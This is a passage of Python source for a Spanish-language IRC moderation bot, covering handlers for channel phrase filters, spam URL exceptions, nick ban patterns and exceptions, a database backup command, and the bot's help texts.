            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda {tipo}\x03 para más información.")
            return
        canal = args[0]
        valor = " ".join(args[1:]) if len(args) > 1 else ""
        if not self._validar_canal_registrado(nick, canal):
            return
        if sub == "list":
            items = self.db.canal_listar(tipo, canal)
            self._lista_notice(nick, f"— Patrones de frases del canal {canal} —",
                               [f"\x0312{i}.\x03 {it}" for i, it in enumerate(items, 1)],
                               f"El canal \x0312{canal}\x03 no tiene actualmente ningún patrón de frases.")
        elif sub in ("add", "del"):
            if not valor:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda {tipo} {sub}\x03 para más información.")
                return
            if sub == "add":
                if tipo == "text" and not validar_frase(valor):
                    self.pm(nick, "\x034¡Error!\x03 La frase sólo puede contener letras, números o el comodín "
                                  "\x0312*\x03, como por ejemplo \x0312*Chupar*20cm*\x03")
                    return
                if self.db.canal_agregar(tipo, canal, valor):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La frase \x0312{valor}\x03 ha sido agregada como patrón de frase no permitida en el canal \x033{canal}\x03.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha agregado la frase \x0312{valor}\x03 como patrón de frase no permitida en el canal \x033{canal}\x03")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La frase \x0312{valor}\x03 ya se encuentra agregada a la BD del canal \x0312{canal}\x03.")
            else:
                if self.db.canal_eliminar(tipo, canal, valor):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La frase \x0312{valor}\x03 ha sido eliminada de los patrones de frase no permitidos en el canal \x033{canal}\x03.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha eliminado la frase \x0312{valor}\x03 de la lista de patrones de frase no permitidos en el canal \x033{canal}\x03")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La frase \x0312{valor}\x03 no está agregada a la lista.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda {tipo}\x03 para más información.")

    def _c_spam_canal(self, nick: str, sub: str, args: List[str]) -> None:
        if not args:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda spam\x03 para más información.")
            return
        canal = args[0]
        url   = " ".join(args[1:]) if len(args) > 1 else ""
        if not self._validar_canal_registrado(nick, canal):
            return
        if sub == "list":
            items = self.db.canal_listar("spam", canal)
            self._lista_notice(nick, f"— Excepciones de Spam del canal {canal} —",
                               [f"\x0312{i}.\x03 {it}" for i, it in enumerate(items, 1)],
                               f"El canal \x0312{canal}\x03 no tiene actualmente ninguna excepción de Spam.")
        elif sub in ("add", "del"):
            if not url:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda spam {sub}\x03 para más información.")
                return
            if sub == "add":
                if not validar_url(url):
                    self.pm(nick, "\x034¡Error!\x03 La url debe tener el formato \x0312dominio.extensión\x03, "
                                  "como por ejemplo \x0312chatligue.com\x03")
                    return
                if self.db.canal_agregar("spam", canal, url):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La url \x0312{url}\x03 ha sido agregada como excepción de Spam en el canal \x033{canal}\x03.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha agregado la url \x0312{url}\x03 como excepción de Spam en el canal \x033{canal}\x03")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La url \x0312{url}\x03 ya se encuentra agregada a la BD del canal \x0312{canal}\x03.")
            else:
                if self.db.canal_eliminar("spam", canal, url):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La Url \x0312{url}\x03 ha sido eliminada de las excepciones de Spam del canal \x033{canal}\x03.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha eliminado la url \x0312{url}\x03 de la lista de excepciones de Spam del canal \x033{canal}\x03")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La Url \x0312{url}\x03 no está agregada a la lista.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda spam\x03 para más información.")

    def _c_nick_canal(self, nick: str, sub: str, args: List[str]) -> None:
        if not args:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda nick\x03 para más información.")
            return
        canal  = args[0]
        patron = " ".join(args[1:]) if len(args) > 1 else ""
        if not self._validar_canal_registrado(nick, canal):
            return
        if sub == "list":
            items = self.db.canal_listar("nicks", canal)
            self._lista_notice(nick, f"— Patrones no permitidos en el canal {canal} —",
                               [f"\x0312{i}.\x03 {it}" for i, it in enumerate(items, 1)],
                               f"El canal \x0312{canal}\x03 no tiene actualmente ningún patrón añadido.")
        elif sub == "add":
            if not patron:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda nick add\x03 para más información.")
                return
            if not validar_patron(patron):
                self.pm(nick, "\x034¡Error!\x03 El patrón solo admite números, letras y los símbolos "
                              "\x0312*\x03, \x0312?\x03, \x0312-\x03 y \x0312_\x03, como por ejemplo \x0312_prueb?s-*\x03")
                return
            if self.db.canal_agregar("nicks", canal, patron):
                self.pm(nick, f"\x0310¡Estupendo!\x03 El patrón \x0312{patron}\x03 ha sido agregado como no permitido en el canal \x033{canal}\x03.")
                if self.cfg.canal_ops:
                    self.pm(self.cfg.canal_ops,
                        f"El Administrador \x034{nick}\x03 ha agregado el patrón \x0312{patron}\x03 como no permitido en el canal \x033{canal}\x03")
            else:
                self.pm(nick, f"\x034¡Error!\x03 El patrón \x0312{patron}\x03 ya se encuentra agregado a la BD del canal \x0312{canal}\x03.")
        elif sub == "del":
            if not patron:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda nick del\x03 para más información.")
                return
            if self.db.canal_eliminar("nicks", canal, patron):
                self.pm(nick, f"\x0310¡Estupendo!\x03 El patrón \x0312{patron}\x03 ha sido eliminado de la lista de no permitidos del canal \x033{canal}\x03.")
                if self.cfg.canal_ops:
                    self.pm(self.cfg.canal_ops,
                        f"El Administrador \x034{nick}\x03 ha eliminado el patrón \x0312{patron}\x03 de la lista de no permitidos del canal \x033{canal}\x03")
            else:
                self.pm(nick, f"\x034¡Error!\x03 El patrón \x0312{patron}\x03 no está agregado a la lista.")
        elif sub == "test":
            if not patron:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda nick test\x03 para más información.")
                return
            prohibido = self.db.nick_prohibido(canal, patron)
            excepcion = self.db.nick_excepcion(canal, patron)
            if   prohibido and excepcion: self.pm(nick, f"El nick \x0312{patron}\x03 no puede entrar al canal, necesitaría una excepción.")
            elif prohibido:               self.pm(nick, f"El nick \x0312{patron}\x03 no puede entrar al canal, necesitaría una excepción.")
            else:                         self.pm(nick, f"El nick \x0312{patron}\x03 puede entrar al canal.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda nick\x03 para más información.")

    def _c_enick_canal(self, nick: str, sub: str, args: List[str]) -> None:
        if not args:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda enick\x03 para más información.")
            return
        canal    = args[0]
        nick_obj = " ".join(args[1:]) if len(args) > 1 else ""
        if not self._validar_canal_registrado(nick, canal):
            return
        if sub == "list":
            items = self.db.canal_listar("enicks", canal)
            self._lista_notice(nick, f"— Excepciones de Nicks del canal {canal} —",
                               [f"\x0312{i}.\x03 {it}" for i, it in enumerate(items, 1)],
                               f"El canal \x0312{canal}\x03 no tiene actualmente ninguna excepción de nicks.")
        elif sub == "add":
            if not nick_obj:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda enick add\x03 para más información.")
                return
            if not validar_nick_exacto(nick_obj):
                self.pm(nick, "\x034¡Error!\x03 El nick sólo puede tener números, letras y los símbolos "
                              "\x0312_\x03 y \x0312-\x03, como por ejemplo \x0312Pe-pi_to\x03")
                return
            if self.db.canal_agregar("enicks", canal, nick_obj):
                self.pm(nick, f"\x0310¡Estupendo!\x03 El nick \x0312{nick_obj}\x03 ha sido agregado como excepción de nicks no permitidos en el canal \x033{canal}\x03.")
                if self.cfg.canal_ops:
                    self.pm(self.cfg.canal_ops,
                        f"El Administrador \x034{nick}\x03 ha agregado el nick \x0312{nick_obj}\x03 como excepción de nicks no permitidos en el canal \x033{canal}\x03")
            else:
                self.pm(nick, f"\x034¡Error!\x03 El nick \x0312{nick_obj}\x03 ya se encuentra agregado a la BD del canal \x0312{canal}\x03.")
        elif sub == "del":
            if not nick_obj:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda enick del\x03 para más información.")
                return
            if self.db.canal_eliminar("enicks", canal, nick_obj):
                self.pm(nick, f"\x0310¡Estupendo!\x03 El nick \x0312{nick_obj}\x03 ha sido eliminado de las excepciones de nicks no permitidos en el canal \x033{canal}\x03.")
                if self.cfg.canal_ops:
                    self.pm(self.cfg.canal_ops,
                        f"El Administrador \x034{nick}\x03 ha eliminado el nick \x0312{nick_obj}\x03 de la lista de excepciones de nicks no permitidos en el canal \x033{canal}\x03")
            else:
                self.pm(nick, f"\x034¡Error!\x03 El nick \x0312{nick_obj}\x03 no está agregado a la lista.")
        elif sub == "test":
            if not nick_obj:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda enick test\x03 para más información.")
                return
            if not validar_nick_exacto(nick_obj):
                self.pm(nick, "\x034¡Error!\x03 El nick sólo puede tener números, letras y los símbolos "
                              "\x0312_\x03 y \x0312-\x03, como por ejemplo \x0312Pe-pi_to\x03")
                return
            prohibido = self.db.nick_prohibido(canal, nick_obj)
            excepcion = self.db.nick_excepcion(canal, nick_obj)
            if   prohibido and excepcion: self.pm(nick, f"El nick \x0312{nick_obj}\x03 puede entrar al canal.")
            elif prohibido:               self.pm(nick, f"El nick \x0312{nick_obj}\x03 no puede entrar al canal, necesitaría una excepción.")
            else:                         self.pm(nick, f"El nick \x0312{nick_obj}\x03 puede entrar al canal.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda enick\x03 para más información.")

    def _c_backup(self, nick: str) -> None:
        backup_dir = self.base_dir / "backups"
        backup_dir.mkdir(exist_ok=True)
        filename = f"backup_{datetime.now().strftime('%d-%m-%Y_%H%M%S')}.zip"
        try:
            with zipfile.ZipFile(backup_dir / filename, "w", zipfile.ZIP_DEFLATED) as zf:
                for fichero in self.db.base.rglob("*"):
                    if fichero.is_file():
                        zf.write(fichero, fichero.relative_to(self.base_dir))
            self.pm(nick, f"Backup: \x0312{filename}\x03")
        except Exception as exc:
            self.pm(nick, f"Error: {exc}")

    def _c_ayuda(self, nick: str, sub: str = "", sub2: str = "") -> None:
        ops  = self.cfg.canal_ops
        pral = self.cfg.canal_principal
        n    = self.cfg.nick
        def l(txt): self.pm(nick, txt)

        # Clave compuesta para sub-ayuda detallada: "text add", "spam del", etc.
        clave = f"{sub} {sub2}".strip() if sub2 else sub

        ayuda = {
            # --- Ayuda general ---
            "": [
                f"\x034Comandos del bot \x0312{n}\x03",
                "\x031 ",
                f"\x0312op\x03 — Recibir status en {pral}.",
                f"\x0312deop\x03 — Quitarse el status en {pral}.",
                f"\x0312getip\x03 <nick> [ibl] — Ver host y comando de ban.",
                f"\x0312aka\x03 <nick> — Historial de nicks.",
                f"\x0312km|kr|ki|ks|kd|ksp\x03 <nick> — Sanciones rápidas.",
                f"\x0312kb\x03 <nick> [motivo] — Sancionar con motivo.",
                f"\x0312BLAdd|BLDel|BLClear|BList\x03 — Gestión de Blacklist.",
                f"\x0312ub|unban\x03 <nick> — Quitar ban en {pral}.",
                f"\x0312ban\x03 <nick|mask> — Ban sin expulsión (silenciar).",
                f"\x0312clearbans\x03 — Limpieza inteligente de bans antiguos.",
                f"\x0312ibladd|ibldel|iblist\x03 — Gestión de bans protegidos.",
                f"\x0312lock\x03 on|off|status — Bloqueo de canal.",
                f"\x0312wl\x03 add|del|list <nick> — Whitelist del lock.",
                f"\x0312topiclock\x03 on|off — Protección de topic.",
                f"\x0312anuncia\x03 <tipo> — Enviar anuncio con repetición.",
                f"\x0312notify\x03 add|del|list <nick> — Vigilancia de nicks.",
                f"\x0312seen|visto\x03 <nick>|top|stats — Última actividad.",
                "\x031 ",
                f"\x031Comandos por privado \x034(admin+):\x03",
                f"\x0312admin\x03 list|add|del <nick> gestión de administradores.",
                f"\x0312mod\x03 list|add|del <nick> gestión de moderadores.",
                f"\x0312bot\x03 list|add|del <nick> bots exentos de protecciones.",
                f"\x0312canal\x03 list|add|del <#canal> gestión de canales del bot.",
                f"\x0312set\x03 on|off|list <#canal> <proteccion> gestión de protecciones.",
                f"\x0312text\x03 list|add|del <#canal> <frase> frases prohibidas.",
                f"\x0312spam\x03 list|add|del <#canal> <url> whitelist de URLs permitidas.",
                f"\x0312nick\x03 list|add|del|test <#canal> <patron> nicks prohibidos.",
                f"\x0312enick\x03 list|add|del|test <#canal> <nick> excepciones de nicks.",
                f"\x0312ibl\x03 add|del <#canal> <mask> bans permanentes.",
                f"\x0312avoice\x03 list|add|del <#canal> <mask> auto +v al entrar.",
                f"\x0312rango\x03 list|add|del <#canal> supervisión de rango de IP.",
                f"\x0312backup\x03 crea un ZIP con toda la base de datos.",
                f"\x0312join\x03 <#canal> el bot se une al canal.",
                f"\x0312restart\x03 reinicia el bot.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda <comando>",
                f"\x034NOTA: \x031Los comandos de canal son logueados en \x0312{ops}",
            ],
            # --- Comandos de canal ---
            "getip": [
                f"\x0310- Ayuda del comando GETIP -",
                "\x031 ",
                f"\x031Para ver el host de un nick y su comando de ban escribe \x0312/msg {n} getip <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick del usuario.",
                f"\x031Para incluir además el ban permanente IBL escribe \x0312/msg {n} getip <nick> ibl",
            ],
            "aka": [
                f"\x0310- Ayuda del comando AKA -",
                "\x031 ",
                f"\x031Para ver el historial de nicks de un host escribe \x0312/msg {n} aka <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick del usuario.",
            ],
            "seen": [
                f"\x0310- Ayuda del comando SEEN -",
                "\x031 ",
                f"seen <nick> — Muestra la última actividad de un usuario.",
                f"seen top — Muestra el ranking de los 10 nicks más buscados.",
                f"seen stats — Muestra estadísticas globales de la base de datos.",
                "\x031 ",
                f"\x034NOTA:\x031 Si buscas a alguien offline, el bot le avisará cuando entre al canal.",
                f"\x034NOTA:\x031 Rol mínimo requerido: mod.",
            ],
            "lock": [
                f"\x0310- Ayuda del comando LOCK -",
                "\x031 ",
                f"\x0312lock on\x03 bloquea el canal. Expulsa a quien no sea staff ni esté en la whitelist.",
                f"\x0312lock off\x03 desbloquea el canal.",
                f"\x0312lock status\x03 muestra el estado actual del bloqueo.",
                "\x031 ",
                f"\x034NOTA:\x031 Rol mínimo requerido: mod.",
            ],
            "topiclock": [
                f"\x0310- Ayuda del comando TOPICLOCK -",
                "\x031 ",
                f"\x0312topiclock on\x03 guarda el topic actual y lo restaura si alguien lo cambia.",
                f"\x0312topiclock off\x03 desactiva la protección del topic.",
                "\x031 ",
                f"\x034NOTA:\x031 Rol mínimo requerido: mod.",
            ],
            "wl": [
                f"\x0310- Ayuda del comando WL -",
                "\x031 ",
                f"\x0312!wl add\x03 <nick> añade nick a la whitelist del canal.",
                f"\x0312!wl del\x03 <nick> elimina nick de la whitelist.",
                f"\x0312!wl list\x03 muestra la whitelist completa.",
                "\x031 ",
                f"\x034NOTA:\x031 Rol mínimo requerido: admin.",
            ],
            "anuncia": [
                f"\x0310- Ayuda del comando ANUNCIA -",
                "\x031 ",
                f"\x031Para enviar un anuncio a {pral} escribe \x0312/msg {n} !anuncia <tipo>",
                f"\x031Tipos disponibles: \x0312alias  saludo  ignore  nick  normas",
                f"\x031normas se repite cada 2h, el resto cada 1h.",
            ],
            "notify": [
                f"\x0310- Ayuda del comando NOTIFY -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un nick a la lista de vigilancia.",
                f"\x0312DEL\x03 Sirve para eliminar un nick de la lista de vigilancia.",
                f"\x0312LIST\x03 Sirve para listar los nicks vigilados con su estado.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda notify <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda notify add",
            ],
            "notify add": [
                f"\x0310- Ayuda del comando NOTIFY ADD -",
                "\x031 ",
                f"\x031Para agregar un nick a la vigilancia debes escribir \x0312/msg {n} notify add <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick que quieres vigilar, por ejemplo \x0312Pepito",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} notify add Pepito",
                "\x031 ",
                f"\x034NOTA:\x031 El bot avisará en {ops} cuando el nick conecte o desconecte.",
            ],
            "notify del": [
                f"\x0310- Ayuda del comando NOTIFY DEL -",
                "\x031 ",
                f"\x031Para eliminar un nick de la vigilancia debes escribir \x0312/msg {n} notify del <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick a dejar de vigilar, por ejemplo \x0312Pepito",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} notify del Pepito",
            ],
            "notify list": [
                f"\x0310- Ayuda del comando NOTIFY LIST -",
                "\x031 ",
                f"\x031Para ver la lista de nicks vigilados escribe \x0312/msg {n} notify list",
            ],
            # --- Comandos por privado ---
            "admin": [
                f"\x0310- Ayuda del comando ADMIN -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un Administrador a la BD.",
                f"\x0312DEL\x03 Sirve para eliminar un Administrador de la BD.",
                f"\x0312LIST\x03 Sirve para listar los Administradores de la BD.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda admin <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda admin add",
            ],
            "admin add": [
                f"\x0310- Ayuda del comando ADMIN ADD -",
                "\x031 ",
                f"\x031Para agregar un Administrador a la BD debes escribir \x0312/msg {n} admin add <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick del Administrador.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} admin add Pepito",
            ],
            "admin del": [
                f"\x0310- Ayuda del comando ADMIN DEL -",
                "\x031 ",
                f"\x031Para eliminar un Administrador de la BD debes escribir \x0312/msg {n} admin del <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick del Administrador.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} admin del Pepito",
            ],
            "admin list": [
                f"\x0310- Ayuda del comando ADMIN LIST -",
                "\x031 ",
                f"\x031Para ver la lista de Administradores de la BD escribe \x0312/msg {n} admin list",
            ],
            "mod": [
                f"\x0310- Ayuda del comando MOD -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un moderador a la BD.",
                f"\x0312DEL\x03 Sirve para eliminar un moderador de la BD.",
                f"\x0312LIST\x03 Sirve para listar los moderadores de la BD.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda mod <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda mod add",
            ],
            "mod add": [
                f"\x0310- Ayuda del comando MOD ADD -",
                "\x031 ",
                f"\x031Para agregar un moderador a la BD debes escribir \x0312/msg {n} mod add <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick del moderador.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} mod add Pepito",
            ],
            "mod del": [
                f"\x0310- Ayuda del comando MOD DEL -",
                "\x031 ",
                f"\x031Para eliminar un moderador de la BD debes escribir \x0312/msg {n} mod del <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick del moderador.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} mod del Pepito",
            ],
            "mod list": [
                f"\x0310- Ayuda del comando MOD LIST -",
                "\x031 ",
                f"\x031Para ver la lista de moderadores de la BD escribe \x0312/msg {n} mod list",
            ],
            "bot": [
                f"\x0310- Ayuda del comando BOT -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un bot a la BD.",
                f"\x0312DEL\x03 Sirve para eliminar un bot de la BD.",
                f"\x0312LIST\x03 Sirve para listar los bots de la BD.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda bot <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda bot add",
            ],
            "bot add": [
                f"\x0310- Ayuda del comando BOT ADD -",
                "\x031 ",
                f"\x031Para agregar un bot a la BD debes escribir \x0312/msg {n} bot add <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick del bot.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} bot add {n}",
            ],
            "bot del": [
                f"\x0310- Ayuda del comando BOT DEL -",
                "\x031 ",
                f"\x031Para eliminar un bot de la BD debes escribir \x0312/msg {n} bot del <nick>",
                f"\x031Donde pone \x0312<nick>\x03 debes indicar el nick del bot.",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} bot del {n}",
            ],
            "bot list": [
                f"\x0310- Ayuda del comando BOT LIST -",
                "\x031 ",
                f"\x031Para ver la lista de bots de la BD escribe \x0312/msg {n} bot list",
            ],
            "canal": [
                f"\x0310- Ayuda del comando CANAL -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un canal a la BD.",
                f"\x0312DEL\x03 Sirve para eliminar un canal de la BD.",
                f"\x0312LIST\x03 Sirve para listar los canales de la BD.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda canal <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda canal add",
            ],
            "canal add": [
                f"\x0310- Ayuda del comando CANAL ADD -",
                "\x031 ",
                f"\x031Para agregar un canal a la BD debes escribir \x0312/msg {n} canal add <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el nombre del canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} canal add {pral}",
                "\x031 ",
                f"\x034NOTA:\x031 Por defecto no hay ningún filtro ni protección activada.",
            ],
            "canal del": [
                f"\x0310- Ayuda del comando CANAL DEL -",
                "\x031 ",
                f"\x031Para eliminar un canal de la BD debes escribir \x0312/msg {n} canal del <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el nombre del canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} canal del {pral}",
            ],
            "canal list": [
                f"\x0310- Ayuda del comando CANAL LIST -",
                "\x031 ",
                f"\x031Para ver la lista de canales de la BD escribe \x0312/msg {n} canal list",
            ],
            "set": [
                f"\x0310- Ayuda del comando SET -",
                "\x031 ",
                f"\x0312ON\x03 Sirve para activar protecciones en un canal.",
                f"\x0312OFF\x03 Sirve para desactivar protecciones en un canal.",
                f"\x0312LIST\x03 Sirve para ver el estado de protecciones de un canal.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda set <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda set on",
            ],
            "set on": [
                f"\x0310- Ayuda del comando SET ON -",
                "\x031 ",
                f"\x031Para activar una protección en un canal debes escribir \x0312/msg {n} set on <#canal> <proteccion>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<proteccion>\x03 debes indicar el tipo de protección, por ejemplo \x0312Mayusculas",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} set on {pral} Mayusculas",
                "\x031 ",
                f"\x031Para ver los tipos de protecciones escribe \x0312/msg {n} ayuda set list",
            ],
            "set off": [
                f"\x0310- Ayuda del comando SET OFF -",
                "\x031 ",
                f"\x031Para desactivar una protección en un canal debes escribir \x0312/msg {n} set off <#canal> <proteccion>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<proteccion>\x03 debes indicar el tipo de protección, por ejemplo \x0312Mayusculas",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} set off {pral} Mayusculas",
                "\x031 ",
                f"\x031Para ver los tipos de protecciones escribe \x0312/msg {n} ayuda set list",
            ],
            "set list": [
                f"\x0310- Ayuda del comando SET LIST -",
                "\x031 ",
                f"\x031Para ver el estado de las protecciones en un canal debes escribir \x0312/msg {n} set list <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} set list {pral}",
            ],
            "text": [
                f"\x0310- Ayuda del comando TEXT -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un patrón de frase no permitida.",
                f"\x0312DEL\x03 Sirve para eliminar un patrón de frase no permitida.",
                f"\x0312LIST\x03 Sirve para listar los patrones de frases no permitidas.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda text <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda text add",
            ],
            "text add": [
                f"\x0310- Ayuda del comando TEXT ADD -",
                "\x031 ",
                f"\x031Para agregar un patrón de frase no permitida debes escribir \x0312/msg {n} text add <#canal> <patron>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal al cual agregarás la frase, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<patron>\x03 debes indicar el patrón que agregarás, por ejemplo \x0312*Busco*Follar*",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} text add {pral} *Busco*Follar*",
                "\x031 ",
                f"\x034NOTA:\x031 el patrón puede contener el comodín \x0312*",
            ],
            "text del": [
                f"\x0310- Ayuda del comando TEXT DEL -",
                "\x031 ",
                f"\x031Para eliminar un patrón de frase no permitida debes escribir \x0312/msg {n} text del <#canal> <patron>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal del cual eliminarás la frase, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<patron>\x03 debes indicar el patrón a eliminar, por ejemplo \x0312*Busco*Follar*",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} text del {pral} *Busco*Follar*",
                "\x031 ",
                f"\x034NOTA:\x031 el patrón puede contener el comodín \x0312*",
            ],
            "text list": [
                f"\x0310- Ayuda del comando TEXT LIST -",
                "\x031 ",
                f"\x031Para ver la lista de frases no permitidas debes escribir \x0312/msg {n} text list <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} text list {pral}",
            ],
            "spam": [
                f"\x0310- Ayuda del comando SPAM -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar una excepción de Spam.",
                f"\x0312DEL\x03 Sirve para eliminar una excepción de Spam.",
                f"\x0312LIST\x03 Sirve para listar las excepciones de Spam.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda spam <opcion>",
                f"\x031Por ejemplo \x0312/msg {n} ayuda spam add",
            ],
            "spam add": [
                f"\x0310- Ayuda del comando SPAM ADD -",
                "\x031 ",
                f"\x031Para agregar una url al filtro de excepciones de Spam debes escribir \x0312/msg {n} spam add <#canal> <url>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<url>\x03 debes indicar la url permitida, por ejemplo \x0312chatligue.com",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} spam add {pral} chatligue.com",
                "\x031 ",
                f"\x034NOTA:\x031 el dominio no debe contener ni http ni www, sólo el nombre de dominio con la extensión.",
            ],
            "spam del": [
                f"\x0310- Ayuda del comando SPAM DEL -",
                "\x031 ",
                f"\x031Para eliminar una url del filtro de excepciones de Spam debes escribir \x0312/msg {n} spam del <#canal> <url>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Donde pone \x0312<url>\x03 debes indicar la url a eliminar, por ejemplo \x0312chatligue.com",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} spam del {pral} chatligue.com",
                "\x031 ",
                f"\x034NOTA:\x031 el dominio no debe contener ni http ni www, sólo el nombre de dominio con la extensión.",
            ],
            "spam list": [
                f"\x0310- Ayuda del comando SPAM LIST -",
                "\x031 ",
                f"\x031Para ver la lista de urls permitidas debes escribir \x0312/msg {n} spam list <#canal>",
                f"\x031Donde pone \x0312<#canal>\x03 debes indicar el canal, por ejemplo \x0312{pral}",
                f"\x031Así pues el comando que tendrías que escribir sería \x0312/msg {n} spam list {pral}",
            ],
            "nick": [
                f"\x0310- Ayuda del comando NICK -",
                "\x031 ",
                f"\x0312ADD\x03 Sirve para agregar un patrón de nick no permitido.",
                f"\x0312DEL\x03 Sirve para eliminar un patrón de nick no permitido.",
                f"\x0312LIST\x03 Sirve para listar los patrones de nicks no permitidos.",
                "\x031 ",
                f"\x031Para más información escribe \x0312/msg {n} ayuda nick <opcion>",
